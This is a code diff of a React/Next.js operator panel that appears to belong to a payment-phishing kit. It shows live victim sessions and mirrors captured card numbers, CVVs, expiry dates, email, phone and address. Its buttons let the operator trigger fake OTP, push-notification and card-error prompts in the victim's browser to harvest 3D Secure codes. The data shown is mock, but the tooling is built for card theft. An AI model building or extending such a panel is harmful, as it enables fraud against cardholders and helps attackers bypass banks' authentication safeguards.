@@ -1,10 +1,13 @@
 "use client";
 
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import { useParams } from "next/navigation";
 import { ref, onValue, update } from "firebase/database";
 import { db } from "@/lib/firebase";
-import { Smartphone, Monitor, CreditCard, Bell, CheckCircle, XCircle, Lock, MapPin, Globe } from "lucide-react";
+import {
+    Smartphone, Monitor, CreditCard, Bell, CheckCircle, XCircle,
+    Lock, MapPin, Globe, Clock, Terminal, Shield, MessageSquare
+} from "lucide-react";
 import CardVisual from "@/components/CardVisual";
 
 interface SessionData {
@@ -16,9 +19,24 @@ interface SessionData {
     name?: string;
     cvv?: string;
     expiry?: string;
+    email?: string;
+    phone?: string;
+    address?: string;
+    city?: string;
+    state?: string;
+    zip?: string;
+    delivery?: string;
     status: "active" | "success" | "failed";
     lastActive: number;
     currentLocation?: string;
+    logs: LogEntry[];
+}
+
+interface LogEntry {
+    id: string;
+    type: "info" | "input" | "otp" | "error" | "success";
+    message: string;
+    timestamp: number;
 }
 
 export default function LivePanel() {
@@ -26,212 +44,276 @@ export default function LivePanel() {
     const projectId = params.projectId as string;
     const [sessions, setSessions] = useState<SessionData[]>([]);
     const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
+    const chatEndRef = useRef<HTMLDivElement>(null);
 
-    // Mock data for UI testing if Firebase is not connected
+    // Mock Data Generator
     useEffect(() => {
-        // In a real scenario, this would be the Firebase listener
+        // In real app: Listen to Firebase
         // const sessionsRef = ref(db, `projects/${projectId}/sessions`);
-        // return onValue(sessionsRef, (snapshot) => { ... });
+        // onValue(sessionsRef, (snapshot) => { ... });
 
-        // For now, let's populate with some dummy data to show the UI
-        setSessions([
-            {
-                id: "sess_123",
-                ip: "192.168.1.1",
-                ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
-                device: "Mobile (iPhone)",
-                card: "4242424242424242",
-                name: "JOHN DOE",
-                cvv: "123",
-                expiry: "12/25",
-                status: "active",
-                lastActive: Date.now(),
-                currentLocation: "/shop/product/nike-air-max"
-            }
-        ]);
-        setSelectedSessionId("sess_123");
+        // Mock Session
+        const mockSession: SessionData = {
+            id: "sess_demo_123",
+            ip: "192.168.1.1",
+            ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
+            device: "iPhone 14 Pro",
+            card: "4242424242424242",
+            name: "JOHN DOE",
+            cvv: "123",
+            expiry: "12/25",
+            email: "johndoe@gmail.com",
+            phone: "555-123-4567",
+            address: "123 Main St",
+            city: "New York",
+            state: "NY",
+            zip: "10001",
+            delivery: "express",
+            status: "active",
+            lastActive: Date.now(),
+            currentLocation: "/checkout",
+            logs: [
+                { id: "1", type: "info", message: "Session Started", timestamp: Date.now() - 50000 },
+                { id: "2", type: "info", message: "Visited /shop", timestamp: Date.now() - 45000 },
+                { id: "3", type: "info", message: "Added Nike Air Max to Cart", timestamp: Date.now() - 40000 },
+                { id: "4", type: "info", message: "Visited /checkout", timestamp: Date.now() - 30000 },
+                { id: "5", type: "input", message: "Email: johndoe@...", timestamp: Date.now() - 25000 },
+                { id: "6", type: "input", message: "Card: 4242 4242...", timestamp: Date.now() - 15000 },
+                { id: "7", type: "otp", message: "OTP Requested by User", timestamp: Date.now() - 5000 },
+            ]
+        };
+        setSessions([mockSession]);
+        setSelectedSessionId(mockSession.id);
     }, [projectId]);
-
-    const sendCommand = async (command: string) => {
-        if (!selectedSessionId) return;
-        // await update(ref(db, `projects/${projectId}/sessions/${selectedSessionId}`), { command });
-        console.log(`Sending command: ${command} to ${selectedSessionId}`);
-    };
 
     const selectedSession = sessions.find(s => s.id === selectedSessionId);
 
+    const sendCommand = (command: string) => {
+        console.log(`Sending command: ${command}`);
+        // In real app: update(ref(db, ...), { command });
+
+        // Mock adding to log
+        if (selectedSession) {
+            const newLog: LogEntry = {
+                id: Math.random().toString(),
+                type: "info",
+                message: `Admin Command: ${command}`,
+                timestamp: Date.now()
+            };
+            // Update local state for demo
+            setSessions(prev => prev.map(s =>
+                s.id === selectedSession.id ? { ...s, logs: [...s.logs, newLog] } : s
+            ));
+        }
+    };
+
+    // Auto-scroll chat
+    useEffect(() => {
+        chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
+    }, [selectedSession?.logs]);
+
+    if (!selectedSession) return <div className="bg-[#0f111a] h-screen text-white flex items-center justify-center">Loading...</div>;
+
     return (
-        <div className="flex h-screen bg-[#0f111a] text-white overflow-hidden font-sans">
-            {/* Sidebar - Session List */}
-            <div className="w-80 border-r border-white/10 bg-[#151923] flex flex-col">
-                <div className="p-4 border-b border-white/10 bg-[#1a1f2e]">
-                    <h2 className="font-bold text-sm uppercase tracking-wider flex items-center gap-2 text-blue-400">
-                        <ActivityIcon className="w-4 h-4" />
-                        Live Visitors
+        <div className="flex h-screen bg-[#0b0e14] text-gray-300 font-sans overflow-hidden">
+
+            {/* LEFT COLUMN: Browser Info */}
+            <div className="w-80 bg-[#11141d] border-r border-white/5 flex flex-col">
+                <div className="p-4 border-b border-white/5 bg-[#161b26]">
+                    <h2 className="text-xs font-bold uppercase tracking-widest text-blue-400 flex items-center gap-2">
+                        <Globe className="w-4 h-4" /> Browser Info
                     </h2>
                 </div>
-                <div className="flex-1 overflow-y-auto">
-                    {sessions.map((session) => (
-                        <div
-                            key={session.id}
-                            onClick={() => setSelectedSessionId(session.id)}
-                            className={`p-4 border-b border-white/5 cursor-pointer hover:bg-white/5 transition-colors ${selectedSessionId === session.id ? "bg-blue-600/10 border-l-2 border-l-blue-500" : ""
-                                }`}
-                        >
-                            <div className="flex justify-between items-start mb-2">
-                                <span className="font-mono text-xs text-gray-400">{session.ip}</span>
-                                <span className="text-[10px] font-bold px-1.5 py-0.5 bg-green-500/20 text-green-400 rounded">ONLINE</span>
-                            </div>
-                            <div className="flex items-center gap-2 text-sm font-medium mb-1 text-gray-200">
-                                {session.device.includes("Mobile") ? <Smartphone className="w-3 h-3" /> : <Monitor className="w-3 h-3" />}
-                                {session.device}
-                            </div>
-                            <div className="flex items-center gap-1 text-xs text-blue-400 truncate mt-2">
-                                <Globe className="w-3 h-3" />
-                                {session.currentLocation || "/"}
+                <div className="p-4 space-y-6 overflow-y-auto flex-1">
+
+                    {/* User Agent */}
+                    <div className="space-y-2">
+                        <label className="text-xs font-bold text-gray-500 uppercase">User Agent</label>
+                        <div className="bg-[#0b0e14] p-3 rounded border border-white/5 text-xs font-mono break-words text-gray-400">
+                            {selectedSession.ua}
+                        </div>
+                    </div>
+
+                    {/* IP & Country */}
+                    <div className="space-y-2">
+                        <label className="text-xs font-bold text-gray-500 uppercase">IP & Country</label>
+                        <div className="flex items-center gap-2">
+                            <div className="h-2 w-2 rounded-full bg-green-500 animate-pulse"></div>
+                            <span className="text-white font-mono">{selectedSession.ip}</span>
+                            <span className="text-xs bg-blue-500/20 text-blue-400 px-2 py-0.5 rounded">US</span>
+                        </div>
+                    </div>
+
+                    {/* Timezone */}
+                    <div className="space-y-2">
+                        <label className="text-xs font-bold text-gray-500 uppercase">Timezone</label>
+                        <div className="flex items-center gap-2 text-sm">
+                            <Clock className="w-4 h-4 text-gray-500" />
+                            <span>America/New_York (EST)</span>
+                        </div>
+                    </div>
+
+                    {/* Screen Size */}
+                    <div className="space-y-2">
+                        <label className="text-xs font-bold text-gray-500 uppercase">Screen Size</label>
+                        <div className="flex items-center gap-2 text-sm">
+                            <Monitor className="w-4 h-4 text-gray-500" />
+                            <span>390 x 844 (Mobile)</span>
+                        </div>
+                    </div>
+
+                    {/* Platform */}
+                    <div className="space-y-2">
+                        <label className="text-xs font-bold text-gray-500 uppercase">Platform / CPU</label>
+                        <div className="flex items-center gap-2 text-sm">
+                            <Smartphone className="w-4 h-4 text-gray-500" />
+                            <span>iPhone / iOS 16.0</span>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+            {/* CENTER COLUMN: Chat Box (Event Log) */}
+            <div className="flex-1 flex flex-col bg-[#0b0e14] relative">
+                <div className="p-4 border-b border-white/5 bg-[#11141d] flex justify-between items-center">
+                    <h2 className="text-xs font-bold uppercase tracking-widest text-blue-400 flex items-center gap-2">
+                        <MessageSquare className="w-4 h-4" /> Chat Box (Live Events)
+                    </h2>
+                    <div className="flex items-center gap-2 text-xs">
+                        <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+                        <span className="text-green-400">Connected</span>
+                    </div>
+                </div>
+
+                {/* Chat Area */}
+                <div className="flex-1 overflow-y-auto p-4 space-y-4">
+                    {selectedSession.logs.map((log) => (
+                        <div key={log.id} className={`flex ${log.type === 'input' ? 'justify-end' : 'justify-start'}`}>
+                            <div className={`max-w-[80%] rounded-lg p-3 text-sm ${log.type === 'input'
+                                    ? 'bg-blue-600/20 border border-blue-500/30 text-blue-100'
+                                    : log.type === 'otp'
+                                        ? 'bg-yellow-600/20 border border-yellow-500/30 text-yellow-100'
+                                        : 'bg-[#161b26] border border-white/5 text-gray-300'
+                                }`}>
+                                <div className="flex items-center gap-2 mb-1 opacity-50 text-[10px] uppercase tracking-wider">
+                                    {log.type === 'input' ? <Terminal className="w-3 h-3" /> : <Shield className="w-3 h-3" />}
+                                    <span>{new Date(log.timestamp).toLocaleTimeString()}</span>
+                                </div>
+                                <div>{log.message}</div>
                             </div>
                         </div>
                     ))}
+                    <div ref={chatEndRef} />
+                </div>
+
+                {/* Action Bar */}
+                <div className="p-4 bg-[#11141d] border-t border-white/5">
+                    <div className="grid grid-cols-4 gap-3">
+                        <button
+                            onClick={() => sendCommand("OTP")}
+                            className="bg-blue-600/20 hover:bg-blue-600/30 text-blue-400 border border-blue-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
+                        >
+                            Trigger OTP
+                        </button>
+                        <button
+                            onClick={() => sendCommand("PUSH")}
+                            className="bg-purple-600/20 hover:bg-purple-600/30 text-purple-400 border border-purple-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
+                        >
+                            Push Notif
+                        </button>
+                        <button
+                            onClick={() => sendCommand("SUCCESS")}
+                            className="bg-green-600/20 hover:bg-green-600/30 text-green-400 border border-green-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
+                        >
+                            End Success
+                        </button>
+                        <button
+                            onClick={() => sendCommand("FAIL")}
+                            className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
+                        >
+                            End Failed
+                        </button>
+                    </div>
+                    <div className="grid grid-cols-4 gap-3 mt-3">
+                        <button
+                            onClick={() => sendCommand("OTP_ERROR")}
+                            className="bg-yellow-600/20 hover:bg-yellow-600/30 text-yellow-400 border border-yellow-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
+                        >
+                            OTP Error
+                        </button>
+                        <button
+                            onClick={() => sendCommand("CARD_ERROR")}
+                            className="bg-orange-600/20 hover:bg-orange-600/30 text-orange-400 border border-orange-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
+                        >
+                            Card Error
+                        </button>
+                    </div>
                 </div>
             </div>
 
-            {/* Main Content - Live View */}
-            <div className="flex-1 flex flex-col bg-[#0f111a]">
-                {selectedSession ? (
-                    <>
-                        <header className="h-16 border-b border-white/10 bg-[#151923] flex items-center justify-between px-6 shadow-md">
-                            <div className="flex items-center gap-4">
-                                <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
-                                <h1 className="text-lg font-medium text-gray-200">Session ID: <span className="font-mono text-blue-400">{selectedSession.id}</span></h1>
-                            </div>
-                            <div className="flex items-center gap-2 text-sm text-gray-400 bg-white/5 px-3 py-1.5 rounded-full">
-                                <MapPin className="w-4 h-4" />
-                                Current Page: <span className="text-white font-mono">{selectedSession.currentLocation}</span>
-                            </div>
-                        </header>
+            {/* RIGHT COLUMN: Live Mirror */}
+            <div className="w-96 bg-[#11141d] border-l border-white/5 flex flex-col">
+                <div className="p-4 border-b border-white/5 bg-[#161b26]">
+                    <h2 className="text-xs font-bold uppercase tracking-widest text-blue-400 flex items-center gap-2">
+                        <CreditCard className="w-4 h-4" /> Live Mirror
+                    </h2>
+                </div>
 
-                        <main className="flex-1 p-8 grid grid-cols-1 lg:grid-cols-2 gap-8 overflow-y-auto">
+                <div className="p-6 space-y-8 overflow-y-auto flex-1">
 
-                            {/* Left Column: Visuals */}
-                            <div className="space-y-8">
-                                {/* Card Visual Mirror */}
-                                <div className="bg-[#1a1f2e] rounded-2xl border border-white/10 p-8 shadow-xl relative overflow-hidden group">
-                                    <div className="absolute top-0 right-0 p-4 opacity-50 group-hover:opacity-100 transition-opacity">
-                                        <div className="text-xs font-mono text-blue-400 border border-blue-400/30 px-2 py-1 rounded">LIVE MIRROR</div>
-                                    </div>
-
-                                    <div className="transform scale-90 origin-center">
-                                        <CardVisual
-                                            cardNumber={selectedSession.card || ""}
-                                            cardHolder={selectedSession.name || ""}
-                                            expiry={selectedSession.expiry || ""}
-                                            cvv={selectedSession.cvv || ""}
-                                        />
-                                    </div>
-                                </div>
-
-                                {/* Raw Data */}
-                                <div className="bg-[#1a1f2e] rounded-2xl border border-white/10 p-6 shadow-sm">
-                                    <h3 className="text-xs font-bold text-gray-500 uppercase tracking-widest mb-4">Captured Data</h3>
-                                    <div className="space-y-3 font-mono text-sm">
-                                        <div className="flex justify-between border-b border-white/5 pb-2">
-                                            <span className="text-gray-400">Card Number</span>
-                                            <span className="text-white">{selectedSession.card || "---"}</span>
-                                        </div>
-                                        <div className="flex justify-between border-b border-white/5 pb-2">
-                                            <span className="text-gray-400">Expiry</span>
-                                            <span className="text-white">{selectedSession.expiry || "--/--"}</span>
-                                        </div>
-                                        <div className="flex justify-between border-b border-white/5 pb-2">
-                                            <span className="text-gray-400">CVV</span>
-                                            <span className="text-red-400">{selectedSession.cvv || "---"}</span>
-                                        </div>
-                                        <div className="flex justify-between pt-2">
-                                            <span className="text-gray-400">Holder</span>
-                                            <span className="text-white">{selectedSession.name || "---"}</span>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-
-                            {/* Right Column: Controls */}
-                            <div className="space-y-6">
-                                <div className="bg-[#1a1f2e] rounded-2xl border border-white/10 p-6 shadow-sm">
-                                    <h3 className="text-xs font-bold text-gray-500 uppercase tracking-widest mb-6">Live Actions</h3>
-
-                                    <div className="grid grid-cols-2 gap-4">
-                                        <button
-                                            onClick={() => sendCommand("OTP")}
-                                            className="group relative overflow-hidden p-6 rounded-xl bg-blue-600/10 hover:bg-blue-600/20 border border-blue-500/30 transition-all text-left"
-                                        >
-                                            <div className="absolute top-0 right-0 p-3 opacity-20 group-hover:opacity-100 transition-opacity">
-                                                <Lock className="w-6 h-6 text-blue-400" />
-                                            </div>
-                                            <div className="font-bold text-blue-400 text-lg mb-1">3D Secure</div>
-                                            <div className="text-xs text-blue-300/60">Trigger OTP Modal</div>
-                                        </button>
-
-                                        <button
-                                            onClick={() => sendCommand("PUSH")}
-                                            className="group relative overflow-hidden p-6 rounded-xl bg-purple-600/10 hover:bg-purple-600/20 border border-purple-500/30 transition-all text-left"
-                                        >
-                                            <div className="absolute top-0 right-0 p-3 opacity-20 group-hover:opacity-100 transition-opacity">
-                                                <Bell className="w-6 h-6 text-purple-400" />
-                                            </div>
-                                            <div className="font-bold text-purple-400 text-lg mb-1">Push Notif</div>
-                                            <div className="text-xs text-purple-300/60">Send Mobile Alert</div>
-                                        </button>
-
-                                        <button
-                                            onClick={() => sendCommand("SUCCESS")}
-                                            className="group relative overflow-hidden p-6 rounded-xl bg-green-600/10 hover:bg-green-600/20 border border-green-500/30 transition-all text-left"
-                                        >
-                                            <div className="absolute top-0 right-0 p-3 opacity-20 group-hover:opacity-100 transition-opacity">
-                                                <CheckCircle className="w-6 h-6 text-green-400" />
-                                            </div>
-                                            <div className="font-bold text-green-400 text-lg mb-1">Approve</div>
-                                            <div className="text-xs text-green-300/60">End with Success</div>
-                                        </button>
-
-                                        <button
-                                            onClick={() => sendCommand("FAIL")}
-                                            className="group relative overflow-hidden p-6 rounded-xl bg-red-600/10 hover:bg-red-600/20 border border-red-500/30 transition-all text-left"
-                                        >
-                                            <div className="absolute top-0 right-0 p-3 opacity-20 group-hover:opacity-100 transition-opacity">
-                                                <XCircle className="w-6 h-6 text-red-400" />
-                                            </div>
-                                            <div className="font-bold text-red-400 text-lg mb-1">Decline</div>
-                                            <div className="text-xs text-red-300/60">End with Error</div>
-                                        </button>
-                                    </div>
-                                </div>
-
-                                <div className="bg-[#1a1f2e] rounded-2xl border border-white/10 p-6 shadow-sm">
-                                    <h3 className="text-xs font-bold text-gray-500 uppercase tracking-widest mb-4">Device Fingerprint</h3>
-                                    <div className="bg-[#0f111a] rounded-lg p-4 font-mono text-xs text-gray-400 break-all border border-white/5">
-                                        {selectedSession.ua}
-                                    </div>
-                                </div>
-                            </div>
-                        </main>
-                    </>
-                ) : (
-                    <div className="flex-1 flex items-center justify-center text-gray-500 flex-col gap-4">
-                        <div className="w-16 h-16 rounded-full bg-white/5 flex items-center justify-center">
-                            <ActivityIcon className="w-8 h-8 opacity-50" />
+                    {/* Card Visual */}
+                    <div className="relative group">
+                        <div className="absolute -inset-1 bg-gradient-to-r from-blue-600 to-purple-600 rounded-2xl blur opacity-20 group-hover:opacity-40 transition duration-1000"></div>
+                        <div className="relative">
+                            <CardVisual
+                                cardNumber={selectedSession.card || ""}
+                                cardHolder={selectedSession.name || ""}
+                                expiry={selectedSession.expiry || ""}
+                                cvv={selectedSession.cvv || ""}
+                            />
                         </div>
-                        <p>Select a live session to monitor</p>
                     </div>
-                )}
-            </div>
-        </div>
-    );
-}
 
-function ActivityIcon({ className }: { className?: string }) {
-    return (
-        <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-            <path d="M22 12h-4l-3 9L9 3l-3 9H2" />
-        </svg>
+                    {/* Captured Data Table */}
+                    <div className="bg-[#0b0e14] rounded-xl border border-white/5 overflow-hidden">
+                        <div className="px-4 py-3 border-b border-white/5 bg-[#161b26] flex justify-between items-center">
+                            <span className="text-xs font-bold text-gray-500 uppercase">Captured Fields</span>
+                            <span className="text-[10px] bg-blue-500/20 text-blue-400 px-2 py-0.5 rounded">Live</span>
+                        </div>
+                        <div className="divide-y divide-white/5">
+                            {[
+                                { label: "Email", value: selectedSession.email },
+                                { label: "Phone", value: selectedSession.phone },
+                                { label: "Name", value: selectedSession.name },
+                                { label: "Address", value: selectedSession.address },
+                                { label: "City/State", value: `${selectedSession.city}, ${selectedSession.state} ${selectedSession.zip}` },
+                                { label: "Delivery", value: selectedSession.delivery?.toUpperCase() },
+                            ].map((item, i) => (
+                                <div key={i} className="px-4 py-3 flex flex-col gap-1">
+                                    <span className="text-[10px] text-gray-500 uppercase tracking-wider">{item.label}</span>
+                                    <span className="text-sm text-gray-200 font-mono break-all">{item.value || "---"}</span>
+                                </div>
+                            ))}
+                        </div>
+                    </div>
+
+                    {/* 3D Secure Preview */}
+                    <div className="bg-[#0b0e14] rounded-xl border border-white/5 overflow-hidden opacity-50">
+                        <div className="px-4 py-3 border-b border-white/5 bg-[#161b26]">
+                            <span className="text-xs font-bold text-gray-500 uppercase">3D Secure State</span>
+                        </div>
+                        <div className="p-4 text-center">
+                            <div className="text-xs text-gray-500 mb-2">Waiting for trigger...</div>
+                            <div className="w-full h-2 bg-[#161b26] rounded-full overflow-hidden">
+                                <div className="h-full bg-blue-600 w-0"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
     );
 }
